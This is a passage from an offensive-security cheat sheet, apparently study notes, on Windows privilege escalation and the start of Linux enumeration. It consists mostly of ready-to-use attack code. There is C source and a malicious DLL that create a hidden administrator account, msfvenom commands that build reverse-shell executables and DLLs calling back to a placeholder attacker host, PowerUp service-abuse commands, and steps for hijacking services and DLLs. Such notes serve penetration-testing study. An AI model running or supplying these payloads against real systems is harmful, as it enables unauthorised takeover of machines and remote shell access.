</span><span id="__span-88-5"><a id="__codelineno-88-5" name="__codelineno-88-5" href="#__codelineno-88-5"></a><span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
</span><span id="__span-88-6"><a id="__codelineno-88-6" name="__codelineno-88-6" href="#__codelineno-88-6"></a>
</span><span id="__span-88-7"><a id="__codelineno-88-7" name="__codelineno-88-7" href="#__codelineno-88-7"></a><span class="w">  </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;net user dave2 password123! /add&quot;</span><span class="p">);</span>
</span><span id="__span-88-8"><a id="__codelineno-88-8" name="__codelineno-88-8" href="#__codelineno-88-8"></a><span class="w">  </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;net localgroup administrators dave2 /add&quot;</span><span class="p">);</span>
</span><span id="__span-88-9"><a id="__codelineno-88-9" name="__codelineno-88-9" href="#__codelineno-88-9"></a>
</span><span id="__span-88-10"><a id="__codelineno-88-10" name="__codelineno-88-10" href="#__codelineno-88-10"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-88-11"><a id="__codelineno-88-11" name="__codelineno-88-11" href="#__codelineno-88-11"></a><span class="p">}</span>
</span></code></pre></div>
<p><strong><em>Abuse the Vulnerable Service Binary - Generate PE</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a>x86_64-w64-mingw32-gcc<span class="w"> </span>code.c<span class="w"> </span>-o<span class="w"> </span>malicious.exe
</span></code></pre></div>
<p><strong><em>Check Vulnerable Service Startup Type</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a><span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">win32_service</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Name</span><span class="p">,</span> <span class="n">StartMode</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Name</span> <span class="o">-like</span> <span class="s1">&#39;mysql&#39;</span><span class="p">}</span>
</span></code></pre></div>
<p><strong><em>Restart the Service</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a><span class="n">net</span> <span class="n">stop</span> <span class="no">[service]</span>
</span><span id="__span-91-2"><a id="__codelineno-91-2" name="__codelineno-91-2" href="#__codelineno-91-2"></a><span class="n">net</span> <span class="nb">start </span><span class="no">[service]</span>
</span><span id="__span-91-3"><a id="__codelineno-91-3" name="__codelineno-91-3" href="#__codelineno-91-3"></a>
</span><span id="__span-91-4"><a id="__codelineno-91-4" name="__codelineno-91-4" href="#__codelineno-91-4"></a><span class="nb">Start-Service</span> <span class="no">[service]</span>
</span><span id="__span-91-5"><a id="__codelineno-91-5" name="__codelineno-91-5" href="#__codelineno-91-5"></a><span class="nb">Stop-Service</span> <span class="no">[service]</span>
</span><span id="__span-91-6"><a id="__codelineno-91-6" name="__codelineno-91-6" href="#__codelineno-91-6"></a>
</span><span id="__span-91-7"><a id="__codelineno-91-7" name="__codelineno-91-7" href="#__codelineno-91-7"></a><span class="n">shutdown</span> <span class="p">/</span><span class="nb">r </span><span class="p">/</span><span class="n">t</span> <span class="n">0</span>
</span></code></pre></div>
<p><strong><em>Abuse the Vulnerable Service Binary - Automated tool</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a><span class="nb">Set-ExecutionPolicy</span> <span class="n">Unrestricted</span> <span class="n">-Scope</span> <span class="n">currentUser</span>
</span><span id="__span-92-2"><a id="__codelineno-92-2" name="__codelineno-92-2" href="#__codelineno-92-2"></a><span class="nb">import-module</span> <span class="p">.\</span><span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span>
</span><span id="__span-92-3"><a id="__codelineno-92-3" name="__codelineno-92-3" href="#__codelineno-92-3"></a>
</span><span id="__span-92-4"><a id="__codelineno-92-4" name="__codelineno-92-4" href="#__codelineno-92-4"></a><span class="nb">Get-ModifiableServiceFile</span>
</span></code></pre></div>
<h4 id="dll-hijacking"><strong>DLL Hijacking</strong></h4>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a><span class="gu">## Process Explorer</span>
</span><span id="__span-93-2"><a id="__codelineno-93-2" name="__codelineno-93-2" href="#__codelineno-93-2"></a>https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer
</span><span id="__span-93-3"><a id="__codelineno-93-3" name="__codelineno-93-3" href="#__codelineno-93-3"></a>
</span><span id="__span-93-4"><a id="__codelineno-93-4" name="__codelineno-93-4" href="#__codelineno-93-4"></a><span class="gu">## Process Monitor</span>
</span><span id="__span-93-5"><a id="__codelineno-93-5" name="__codelineno-93-5" href="#__codelineno-93-5"></a>https://learn.microsoft.com/en-us/sysinternals/downloads/procmon
</span><span id="__span-93-6"><a id="__codelineno-93-6" name="__codelineno-93-6" href="#__codelineno-93-6"></a>
</span><span id="__span-93-7"><a id="__codelineno-93-7" name="__codelineno-93-7" href="#__codelineno-93-7"></a><span class="gu">## list of Vulnerable Applications</span>
</span><span id="__span-93-8"><a id="__codelineno-93-8" name="__codelineno-93-8" href="#__codelineno-93-8"></a>https://web.archive.org/web/20140222035441/https:/www.exploit-db.com/dll-hijacking-vulnerable-applications/
</span><span id="__span-93-9"><a id="__codelineno-93-9" name="__codelineno-93-9" href="#__codelineno-93-9"></a>
</span><span id="__span-93-10"><a id="__codelineno-93-10" name="__codelineno-93-10" href="#__codelineno-93-10"></a>When a program is launched, the DLL Search Order in most cases is as follows:
</span><span id="__span-93-11"><a id="__codelineno-93-11" name="__codelineno-93-11" href="#__codelineno-93-11"></a>
</span><span id="__span-93-12"><a id="__codelineno-93-12" name="__codelineno-93-12" href="#__codelineno-93-12"></a>1.The directory from which the application was launched
</span><span id="__span-93-13"><a id="__codelineno-93-13" name="__codelineno-93-13" href="#__codelineno-93-13"></a>2.The<span class="sb">`C:\Windows\System32`</span>directory
</span><span id="__span-93-14"><a id="__codelineno-93-14" name="__codelineno-93-14" href="#__codelineno-93-14"></a>3.The 16-bit Windows system directory (i.e,<span class="sb">`C:\windows\system`</span>)
</span><span id="__span-93-15"><a id="__codelineno-93-15" name="__codelineno-93-15" href="#__codelineno-93-15"></a>4.The Windows directory (<span class="sb">`C:\windows`</span>)
</span><span id="__span-93-16"><a id="__codelineno-93-16" name="__codelineno-93-16" href="#__codelineno-93-16"></a>5.The current directory at the time of execution
</span><span id="__span-93-17"><a id="__codelineno-93-17" name="__codelineno-93-17" href="#__codelineno-93-17"></a>6.Any directories specified by the %PATH% environment variable
</span><span id="__span-93-18"><a id="__codelineno-93-18" name="__codelineno-93-18" href="#__codelineno-93-18"></a>
</span><span id="__span-93-19"><a id="__codelineno-93-19" name="__codelineno-93-19" href="#__codelineno-93-19"></a>Process Explorer - Identify file PATH and associated services  
</span><span id="__span-93-20"><a id="__codelineno-93-20" name="__codelineno-93-20" href="#__codelineno-93-20"></a>
</span><span id="__span-93-21"><a id="__codelineno-93-21" name="__codelineno-93-21" href="#__codelineno-93-21"></a>Process Monitor - Apply filters to check what DLL are loaded.
</span><span id="__span-93-22"><a id="__codelineno-93-22" name="__codelineno-93-22" href="#__codelineno-93-22"></a>
</span><span id="__span-93-23"><a id="__codelineno-93-23" name="__codelineno-93-23" href="#__codelineno-93-23"></a>Services - Stop and start services to display dll processes on Process Monitor
</span><span id="__span-93-24"><a id="__codelineno-93-24" name="__codelineno-93-24" href="#__codelineno-93-24"></a>
</span><span id="__span-93-25"><a id="__codelineno-93-25" name="__codelineno-93-25" href="#__codelineno-93-25"></a><span class="gu">## Run Process Monitor with following filters</span>
</span><span id="__span-93-26"><a id="__codelineno-93-26" name="__codelineno-93-26" href="#__codelineno-93-26"></a>Process      &gt; is       &gt;  [process]
</span><span id="__span-93-27"><a id="__codelineno-93-27" name="__codelineno-93-27" href="#__codelineno-93-27"></a>Operation    &gt; contains &gt;  CreateFile
</span><span id="__span-93-28"><a id="__codelineno-93-28" name="__codelineno-93-28" href="#__codelineno-93-28"></a>Result       &gt; contains &gt;  NAME NOT FOUND
</span><span id="__span-93-29"><a id="__codelineno-93-29" name="__codelineno-93-29" href="#__codelineno-93-29"></a>Path         &gt; end with &gt;  .dll
</span></code></pre></div>
<p><strong><em>Create Malicious DLL with MSFVenom</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=[</span>IP<span class="o">]</span><span class="w"> </span><span class="nv">LPORT</span><span class="o">=[</span>PORT<span class="o">]</span><span class="w"> </span>-f<span class="w"> </span>dll<span class="w"> </span>-o<span class="w"> </span>injection.dll
</span></code></pre></div>
<p><strong><em>Create Malicious DLL with C++ Code</em></strong></p>
<div class="language-cpp highlight"><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1" href="#__codelineno-95-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;windows.h&gt;</span>
</span><span id="__span-95-2"><a id="__codelineno-95-2" name="__codelineno-95-2" href="#__codelineno-95-2"></a>
</span><span id="__span-95-3"><a id="__codelineno-95-3" name="__codelineno-95-3" href="#__codelineno-95-3"></a><span class="n">BOOL</span><span class="w"> </span><span class="n">APIENTRY</span><span class="w"> </span><span class="n">DllMain</span><span class="p">(</span>
</span><span id="__span-95-4"><a id="__codelineno-95-4" name="__codelineno-95-4" href="#__codelineno-95-4"></a><span class="n">HANDLE</span><span class="w"> </span><span class="n">hModule</span><span class="p">,</span><span class="c1">// Handle to DLL module</span>
</span><span id="__span-95-5"><a id="__codelineno-95-5" name="__codelineno-95-5" href="#__codelineno-95-5"></a><span class="n">DWORD</span><span class="w"> </span><span class="n">ul_reason_for_call</span><span class="p">,</span><span class="c1">// Reason for calling function</span>
</span><span id="__span-95-6"><a id="__codelineno-95-6" name="__codelineno-95-6" href="#__codelineno-95-6"></a><span class="n">LPVOID</span><span class="w"> </span><span class="n">lpReserved</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="c1">// Reserved</span>
</span><span id="__span-95-7"><a id="__codelineno-95-7" name="__codelineno-95-7" href="#__codelineno-95-7"></a><span class="p">{</span>
</span><span id="__span-95-8"><a id="__codelineno-95-8" name="__codelineno-95-8" href="#__codelineno-95-8"></a><span class="w">    </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">ul_reason_for_call</span><span class="w"> </span><span class="p">)</span>
</span><span id="__span-95-9"><a id="__codelineno-95-9" name="__codelineno-95-9" href="#__codelineno-95-9"></a><span class="w">    </span><span class="p">{</span>
</span><span id="__span-95-10"><a id="__codelineno-95-10" name="__codelineno-95-10" href="#__codelineno-95-10"></a><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_PROCESS_ATTACH</span><span class="p">:</span><span class="w"> </span><span class="c1">// A process is loading the DLL.</span>
</span><span id="__span-95-11"><a id="__codelineno-95-11" name="__codelineno-95-11" href="#__codelineno-95-11"></a><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
</span><span id="__span-95-12"><a id="__codelineno-95-12" name="__codelineno-95-12" href="#__codelineno-95-12"></a><span class="w">        </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;net user dave3 password123! /add&quot;</span><span class="p">);</span>
</span><span id="__span-95-13"><a id="__codelineno-95-13" name="__codelineno-95-13" href="#__codelineno-95-13"></a><span class="w">        </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;net localgroup administrators dave3 /add&quot;</span><span class="p">);</span>
</span><span id="__span-95-14"><a id="__codelineno-95-14" name="__codelineno-95-14" href="#__codelineno-95-14"></a><span class="w">        </span><span class="k">break</span><span class="p">;</span>
</span><span id="__span-95-15"><a id="__codelineno-95-15" name="__codelineno-95-15" href="#__codelineno-95-15"></a><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_THREAD_ATTACH</span><span class="p">:</span><span class="w"> </span><span class="c1">// A process is creating a new thread.</span>
</span><span id="__span-95-16"><a id="__codelineno-95-16" name="__codelineno-95-16" href="#__codelineno-95-16"></a><span class="w">        </span><span class="k">break</span><span class="p">;</span>
</span><span id="__span-95-17"><a id="__codelineno-95-17" name="__codelineno-95-17" href="#__codelineno-95-17"></a><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_THREAD_DETACH</span><span class="p">:</span><span class="w"> </span><span class="c1">// A thread exits normally.</span>
</span><span id="__span-95-18"><a id="__codelineno-95-18" name="__codelineno-95-18" href="#__codelineno-95-18"></a><span class="w">        </span><span class="k">break</span><span class="p">;</span>
</span><span id="__span-95-19"><a id="__codelineno-95-19" name="__codelineno-95-19" href="#__codelineno-95-19"></a><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_PROCESS_DETACH</span><span class="p">:</span><span class="w"> </span><span class="c1">// A process unloads the DLL.</span>
</span><span id="__span-95-20"><a id="__codelineno-95-20" name="__codelineno-95-20" href="#__codelineno-95-20"></a><span class="w">        </span><span class="k">break</span><span class="p">;</span>
</span><span id="__span-95-21"><a id="__codelineno-95-21" name="__codelineno-95-21" href="#__codelineno-95-21"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-95-22"><a id="__codelineno-95-22" name="__codelineno-95-22" href="#__codelineno-95-22"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">TRUE</span><span class="p">;</span>
</span><span id="__span-95-23"><a id="__codelineno-95-23" name="__codelineno-95-23" href="#__codelineno-95-23"></a><span class="p">}</span>
</span></code></pre></div>
<p><strong><em>Generate Executable DLL</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-96-1"><a id="__codelineno-96-1" name="__codelineno-96-1" href="#__codelineno-96-1"></a>x86_64-w64-mingw32-gcc<span class="w"> </span>Malicious.cpp<span class="w"> </span>--shared<span class="w"> </span>-o<span class="w"> </span>injection.dll
</span></code></pre></div>
<h4 id="unquoted-service-paths"><strong>Unquoted Service Paths</strong></h4>
<p><strong><em>Enumerate running and stopped services.</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-97-1"><a id="__codelineno-97-1" name="__codelineno-97-1" href="#__codelineno-97-1"></a><span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">win32_service</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Name</span><span class="p">,</span><span class="n">State</span><span class="p">,</span><span class="n">PathName</span>
</span></code></pre></div>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-98-1"><a id="__codelineno-98-1" name="__codelineno-98-1" href="#__codelineno-98-1"></a><span class="n">wmic</span> <span class="n">service</span> <span class="n">get</span> <span class="n">name</span><span class="p">,</span><span class="n">pathname</span> <span class="p">|</span>  <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&quot;C:\Windows\\&quot;</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&quot;&quot;&quot;</span>
</span></code></pre></div>
<p><strong><em>Check directory permissions</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-99-1"><a id="__codelineno-99-1" name="__codelineno-99-1" href="#__codelineno-99-1"></a><span class="n">icacls</span> <span class="s2">&quot;C:\PATH&quot;</span>
</span></code></pre></div>
<p><strong><em>Restart the Service</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-100-1"><a id="__codelineno-100-1" name="__codelineno-100-1" href="#__codelineno-100-1"></a>net<span class="w"> </span>stop<span class="w"> </span><span class="o">[</span>service<span class="o">]</span>
</span><span id="__span-100-2"><a id="__codelineno-100-2" name="__codelineno-100-2" href="#__codelineno-100-2"></a>net<span class="w"> </span>start<span class="w"> </span><span class="o">[</span>service<span class="o">]</span>
</span><span id="__span-100-3"><a id="__codelineno-100-3" name="__codelineno-100-3" href="#__codelineno-100-3"></a>
</span><span id="__span-100-4"><a id="__codelineno-100-4" name="__codelineno-100-4" href="#__codelineno-100-4"></a>Start-Service<span class="w"> </span><span class="o">[</span>service<span class="o">]</span>
</span><span id="__span-100-5"><a id="__codelineno-100-5" name="__codelineno-100-5" href="#__codelineno-100-5"></a>Stop-Service<span class="w"> </span><span class="o">[</span>service<span class="o">]</span>
</span><span id="__span-100-6"><a id="__codelineno-100-6" name="__codelineno-100-6" href="#__codelineno-100-6"></a>
</span><span id="__span-100-7"><a id="__codelineno-100-7" name="__codelineno-100-7" href="#__codelineno-100-7"></a>shutdown<span class="w"> </span>/r<span class="w"> </span>/t<span class="w"> </span><span class="m">0</span>
</span></code></pre></div>
<p><strong><em>Automated tool</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-101-1"><a id="__codelineno-101-1" name="__codelineno-101-1" href="#__codelineno-101-1"></a><span class="nb">Set-ExecutionPolicy</span> <span class="n">Unrestricted</span> <span class="n">-Scope</span> <span class="n">currentUser</span>
</span><span id="__span-101-2"><a id="__codelineno-101-2" name="__codelineno-101-2" href="#__codelineno-101-2"></a><span class="nb">import-module</span> <span class="p">.\</span><span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span>
</span><span id="__span-101-3"><a id="__codelineno-101-3" name="__codelineno-101-3" href="#__codelineno-101-3"></a>
</span><span id="__span-101-4"><a id="__codelineno-101-4" name="__codelineno-101-4" href="#__codelineno-101-4"></a><span class="nb">Get-UnquotedService</span>
</span><span id="__span-101-5"><a id="__codelineno-101-5" name="__codelineno-101-5" href="#__codelineno-101-5"></a><span class="nb">Invoke-AllChecks</span>
</span></code></pre></div>
<p><strong><em>Abuse the Service</em></strong> </p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-102-1"><a id="__codelineno-102-1" name="__codelineno-102-1" href="#__codelineno-102-1"></a><span class="c">## https://powersploit.readthedocs.io/en/latest/Privesc/Invoke-ServiceAbuse/</span>
</span><span id="__span-102-2"><a id="__codelineno-102-2" name="__codelineno-102-2" href="#__codelineno-102-2"></a>
</span><span id="__span-102-3"><a id="__codelineno-102-3" name="__codelineno-102-3" href="#__codelineno-102-3"></a><span class="c">## With PowerUp - Invoke-ServiceAbuse</span>
</span><span id="__span-102-4"><a id="__codelineno-102-4" name="__codelineno-102-4" href="#__codelineno-102-4"></a><span class="nb">import-module</span> <span class="p">.\</span><span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span>
</span><span id="__span-102-5"><a id="__codelineno-102-5" name="__codelineno-102-5" href="#__codelineno-102-5"></a><span class="nb">Get-UnquotedService</span>
</span><span id="__span-102-6"><a id="__codelineno-102-6" name="__codelineno-102-6" href="#__codelineno-102-6"></a><span class="nb">Invoke-AllChecks</span>
</span><span id="__span-102-7"><a id="__codelineno-102-7" name="__codelineno-102-7" href="#__codelineno-102-7"></a>
</span><span id="__span-102-8"><a id="__codelineno-102-8" name="__codelineno-102-8" href="#__codelineno-102-8"></a><span class="nb">Invoke-ServiceAbuse</span> <span class="n">-Name</span> <span class="n">VulnSVC</span> 
</span><span id="__span-102-9"><a id="__codelineno-102-9" name="__codelineno-102-9" href="#__codelineno-102-9"></a><span class="nb">Invoke-ServiceAbuse</span> <span class="n">-Name</span> <span class="n">VulnSVC</span> <span class="n">-Command</span> <span class="s2">&quot;net ...&quot;</span>
</span><span id="__span-102-10"><a id="__codelineno-102-10" name="__codelineno-102-10" href="#__codelineno-102-10"></a><span class="nb">Invoke-ServiceAbuse</span> <span class="n">-Name</span> <span class="n">VulnSVC</span> <span class="n">-Command</span> <span class="s2">&quot;C:\\tmp\\payload.exe&quot;</span>
</span><span id="__span-102-11"><a id="__codelineno-102-11" name="__codelineno-102-11" href="#__codelineno-102-11"></a>
</span><span id="__span-102-12"><a id="__codelineno-102-12" name="__codelineno-102-12" href="#__codelineno-102-12"></a><span class="c">## Manual - Change Executable with the MSFVenom generatet payloiad</span>
</span><span id="__span-102-13"><a id="__codelineno-102-13" name="__codelineno-102-13" href="#__codelineno-102-13"></a>
</span><span id="__span-102-14"><a id="__codelineno-102-14" name="__codelineno-102-14" href="#__codelineno-102-14"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">x64</span><span class="p">/</span><span class="n">shell_reverse_tcp</span> <span class="n">LHOST</span><span class="p">={</span><span class="n">LHOST</span><span class="p">]</span> <span class="n">LPORT</span><span class="p">=]</span><span class="n">LPORT</span><span class="p">]</span> <span class="o">-f</span> <span class="n">exe</span> <span class="n">-o</span> <span class="no">[VulnService.exe]</span>
</span></code></pre></div>
<h3 id="abusing-other-windows-components"><strong>Abusing Other Windows Components</strong></h3>
<h4 id="scheduled-tasks"><strong>Scheduled Tasks</strong></h4>
<p><strong><em>Three pieces of information are vital to obtain from a scheduled task to identify possible privilege escalation vectors:</em></strong></p>
<ul>
<li>As which user account (principal) does this task get executed?</li>
<li>What triggers are specified for the task?</li>
<li>What actions are executed when one or more of these triggers are met?</li>
</ul>
<p><strong><em>Enumerate Scheduled Tasks</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-103-1"><a id="__codelineno-103-1" name="__codelineno-103-1" href="#__codelineno-103-1"></a><span class="nb">Get-ScheduledTask</span>
</span></code></pre></div>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-104-1"><a id="__codelineno-104-1" name="__codelineno-104-1" href="#__codelineno-104-1"></a><span class="n">schtasks</span> <span class="p">/</span><span class="n">query</span> <span class="p">/</span><span class="n">fo</span> <span class="n">LIST</span> <span class="p">/</span><span class="n">v</span>
</span></code></pre></div>
<p><strong><em>Enumerate scheduled tasks run by user</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-105-1"><a id="__codelineno-105-1" name="__codelineno-105-1" href="#__codelineno-105-1"></a><span class="n">schtasks</span> <span class="p">/</span><span class="n">query</span> <span class="p">/</span><span class="n">fo</span> <span class="n">LIST</span> <span class="p">/</span><span class="n">v</span> <span class="p">|</span> 
</span><span id="__span-105-2"><a id="__codelineno-105-2" name="__codelineno-105-2" href="#__codelineno-105-2"></a>    <span class="k">ForEach</span><span class="n">-Object</span> <span class="n">-Begin</span> <span class="p">{</span> <span class="nv">$block</span> <span class="p">=</span> <span class="p">@()</span> <span class="p">}</span> <span class="p">`</span>
</span><span id="__span-105-3"><a id="__codelineno-105-3" name="__codelineno-105-3" href="#__codelineno-105-3"></a>                   <span class="n">-Process</span> <span class="p">{</span>
</span><span id="__span-105-4"><a id="__codelineno-105-4" name="__codelineno-105-4" href="#__codelineno-105-4"></a>                       <span class="k">if</span> <span class="p">(</span><span class="nv">$_</span> <span class="o">-eq</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span id="__span-105-5"><a id="__codelineno-105-5" name="__codelineno-105-5" href="#__codelineno-105-5"></a>                           <span class="k">if</span> <span class="p">(</span><span class="nv">$block</span> <span class="o">-match</span> <span class="s2">&quot;Run As User:\s+daveadmin&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span id="__span-105-6"><a id="__codelineno-105-6" name="__codelineno-105-6" href="#__codelineno-105-6"></a>                               <span class="nv">$block</span> <span class="n">-join</span> <span class="s2">&quot;</span><span class="se">`n</span><span class="s2">&quot;</span>
</span><span id="__span-105-7"><a id="__codelineno-105-7" name="__codelineno-105-7" href="#__codelineno-105-7"></a>                               <span class="s2">&quot;</span><span class="se">`n</span><span class="s2">&quot;</span> <span class="p">+</span> <span class="p">(</span><span class="s2">&quot;-&quot;</span><span class="p">*</span><span class="n">80</span><span class="p">)</span> <span class="p">+</span> <span class="s2">&quot;</span><span class="se">`n</span><span class="s2">&quot;</span>
</span><span id="__span-105-8"><a id="__codelineno-105-8" name="__codelineno-105-8" href="#__codelineno-105-8"></a>                           <span class="p">}</span>
</span><span id="__span-105-9"><a id="__codelineno-105-9" name="__codelineno-105-9" href="#__codelineno-105-9"></a>                           <span class="nv">$block</span> <span class="p">=</span> <span class="p">@()</span>
</span><span id="__span-105-10"><a id="__codelineno-105-10" name="__codelineno-105-10" href="#__codelineno-105-10"></a>                       <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span id="__span-105-11"><a id="__codelineno-105-11" name="__codelineno-105-11" href="#__codelineno-105-11"></a>                           <span class="nv">$block</span> <span class="p">+=</span> <span class="nv">$_</span>
</span><span id="__span-105-12"><a id="__codelineno-105-12" name="__codelineno-105-12" href="#__codelineno-105-12"></a>                       <span class="p">}</span>
</span><span id="__span-105-13"><a id="__codelineno-105-13" name="__codelineno-105-13" href="#__codelineno-105-13"></a>                   <span class="p">}</span>
</span></code></pre></div>
<h4 id="using-exploits"><strong>Using Exploits</strong></h4>
<p><strong><em>Kernel Exploits</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-106-1"><a id="__codelineno-106-1" name="__codelineno-106-1" href="#__codelineno-106-1"></a><span class="n">systeminfo</span>
</span><span id="__span-106-2"><a id="__codelineno-106-2" name="__codelineno-106-2" href="#__codelineno-106-2"></a>
</span><span id="__span-106-3"><a id="__codelineno-106-3" name="__codelineno-106-3" href="#__codelineno-106-3"></a><span class="c">## Installed Security Patches</span>
</span><span id="__span-106-4"><a id="__codelineno-106-4" name="__codelineno-106-4" href="#__codelineno-106-4"></a><span class="nb">Get-CimInstance</span> <span class="n">-Class</span> <span class="n">win32_quickfixengineering</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Description</span> <span class="o">-eq</span> <span class="s2">&quot;Security Update&quot;</span> <span class="p">}</span>
</span></code></pre></div>
<p><strong><em>Abuse SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege - Potato Vulnerabilities</em></strong></p>
<p><a href="https://github.com/BeichenDream/GodPotato">https://github.com/BeichenDream/GodPotato</a></p>
<p><a href="https://github.com/tylerdotrar/SigmaPotato?tab=readme-ov-file">GitHub - tylerdotrar/SigmaPotato: SeImpersonate privilege escalation tool for Windows 8 - 11 and Windows Server 2012 - 2022 with extensive PowerShell and .NET reflection support.</a></p>
<p><a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc">Jorge Lajara Website</a></p>
<aside>


Other privileges that may lead to privilege escalation are ***SeBackupPrivilege***, ***SeAssignPrimaryToken***, ***SeLoadDriver***, and ***SeDebug***.

</aside>

<hr />
<h2 id="linux-privilege-escalation"><strong>Linux Privilege Escalation</strong></h2>
<h3 id="enumerating-linux"><strong>Enumerating Linux</strong></h3>
<p><strong>Manual Enumeration</strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-107-1"><a id="__codelineno-107-1" name="__codelineno-107-1" href="#__codelineno-107-1"></a><span class="gu">## Enumerate OS/Kernel</span>
</span><span id="__span-107-2"><a id="__codelineno-107-2" name="__codelineno-107-2" href="#__codelineno-107-2"></a>cat /etc/issue
</span><span id="__span-107-3"><a id="__codelineno-107-3" name="__codelineno-107-3" href="#__codelineno-107-3"></a>cat /etc/*-release
</span><span id="__span-107-4"><a id="__codelineno-107-4" name="__codelineno-107-4" href="#__codelineno-107-4"></a>uname -a
</span><span id="__span-107-5"><a id="__codelineno-107-5" name="__codelineno-107-5" href="#__codelineno-107-5"></a>
</span><span id="__span-107-6"><a id="__codelineno-107-6" name="__codelineno-107-6" href="#__codelineno-107-6"></a><span class="gu">## List system processes</span>
</span><span id="__span-107-7"><a id="__codelineno-107-7" name="__codelineno-107-7" href="#__codelineno-107-7"></a>ps aux
</span><span id="__span-107-8"><a id="__codelineno-107-8" name="__codelineno-107-8" href="#__codelineno-107-8"></a>
</span><span id="__span-107-9"><a id="__codelineno-107-9" name="__codelineno-107-9" href="#__codelineno-107-9"></a><span class="gu">## List all connections</span>
</span><span id="__span-107-10"><a id="__codelineno-107-10" name="__codelineno-107-10" href="#__codelineno-107-10"></a>netstat -antp
</span><span id="__span-107-11"><a id="__codelineno-107-11" name="__codelineno-107-11" href="#__codelineno-107-11"></a>
</span><span id="__span-107-12"><a id="__codelineno-107-12" name="__codelineno-107-12" href="#__codelineno-107-12"></a><span class="gu">## Firewall rules</span>
</span><span id="__span-107-13"><a id="__codelineno-107-13" name="__codelineno-107-13" href="#__codelineno-107-13"></a>cat /etc/iptables/rules.v4
</span><span id="__span-107-14"><a id="__codelineno-107-14" name="__codelineno-107-14" href="#__codelineno-107-14"></a>
</span><span id="__span-107-15"><a id="__codelineno-107-15" name="__codelineno-107-15" href="#__codelineno-107-15"></a><span class="gu">## Cron jobs - Task Scheduler</span>
</span><span id="__span-107-16"><a id="__codelineno-107-16" name="__codelineno-107-16" href="#__codelineno-107-16"></a>ls -lah /etc/cron*
</span><span id="__span-107-17"><a id="__codelineno-107-17" name="__codelineno-107-17" href="#__codelineno-107-17"></a>crontab -l
